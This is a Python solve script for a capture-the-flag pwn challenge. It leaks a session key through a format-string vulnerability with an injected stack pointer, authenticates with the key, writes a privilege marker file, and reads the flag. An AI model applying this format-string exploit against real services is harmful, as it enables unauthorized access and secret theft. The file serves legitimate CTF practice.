"""Solve Xuanji's pwn-ezpwn inside an authorized, running challenge instance.

Usage: python3 solve_pwn_ezpwn.py HOST PORT

This reproduces the challenge-specific format-string leak, authenticates with
the leaked key, sets /tmp/priv.list to the expected "cat" marker, reconnects,
and reads the challenge flag. The stack slot and struct offset are specific to
the supplied server build; re-check them if the challenge binary changes.
"""

import re
import socket
import struct
import sys


PROMPT = b"> "
STACK_ARG_FOR_INPUT = 137
TARGET_ARG = 200
STACK_MARKER = b"0x4141414141414141"


def recv_prompt(sock, timeout=5):
    sock.settimeout(0.25)
    data = bytearray()
    deadline = __import__("time").monotonic() + timeout
    while PROMPT not in data and __import__("time").monotonic() < deadline:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            continue
        if not chunk:
            break
        data.extend(chunk)
    if PROMPT not in data:
        raise RuntimeError(f"service did not return its prompt: {bytes(data)!r}")
    return bytes(data).split(PROMPT, 1)[0]


def get_session_key(sock):
    sock.sendall(b"check x\n")
    output = recv_prompt(sock)
    match = re.search(rb"message address: (0x[0-9a-fA-F]+)", output)
    if not match:
        raise RuntimeError(f"could not parse the message address: {output!r}")

    # The server stores its key at struct+0x4c and exposes message at struct+0x0c.
    key_address = int(match.group(1), 16) + 0x40
    fmt = b"%p" * (TARGET_ARG - 1) + b"%s"
    command = b"debug " + fmt
    target_offset = 8 * (TARGET_ARG - STACK_ARG_FOR_INPUT)
    if len(command) >= target_offset:
        raise RuntimeError("format string overlaps the injected pointer")

    # A NUL ends the format string; the pointer after it remains in the stack buffer.
    payload = (
        command
        + b"\x00"
        + b"A" * (target_offset - len(command) - 1)
        + struct.pack("<Q", key_address)
        + b"\n"
    )
    sock.sendall(payload)
    output = recv_prompt(sock)
    marker_at = output.rfind(STACK_MARKER)
    if marker_at < 0:
        raise RuntimeError(f"could not find the injected pointer boundary: {output[-120:]!r}")
    key = output[marker_at + len(STACK_MARKER) :]
    key = key.split(b"\n", 1)[0]
    if not re.fullmatch(rb"[A-Za-z0-9]{16,23}", key):
        raise RuntimeError(f"unexpected key bytes: {key!r}")
    return key


def main(host, port):
    with socket.create_connection((host, port), timeout=5) as sock:
        recv_prompt(sock)
        key = get_session_key(sock)
        sock.sendall(b"auth " + key + b"\n")
        auth = recv_prompt(sock)
        if b"Authentication success" not in auth:
            raise RuntimeError(f"authentication failed: {auth!r}")
        sock.sendall(b"write priv.list cat\n")
        written = recv_prompt(sock)
        if b"written to /tmp/priv.list" not in written:
            raise RuntimeError(f"privilege marker was not written: {written!r}")

    # A new session reads the marker at startup and permits `cat flag`.
    with socket.create_connection((host, port), timeout=5) as sock:
        recv_prompt(sock)
        sock.sendall(b"cat flag\n")
        result = recv_prompt(sock)

    match = re.search(rb"flag\{[^}\r\n]+\}", result)
    if not match:
        raise RuntimeError(f"flag not found in response: {result!r}")
    print(match.group(0).decode("ascii"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        raise SystemExit(f"usage: {sys.argv[0]} HOST PORT")
    main(sys.argv[1], int(sys.argv[2]))
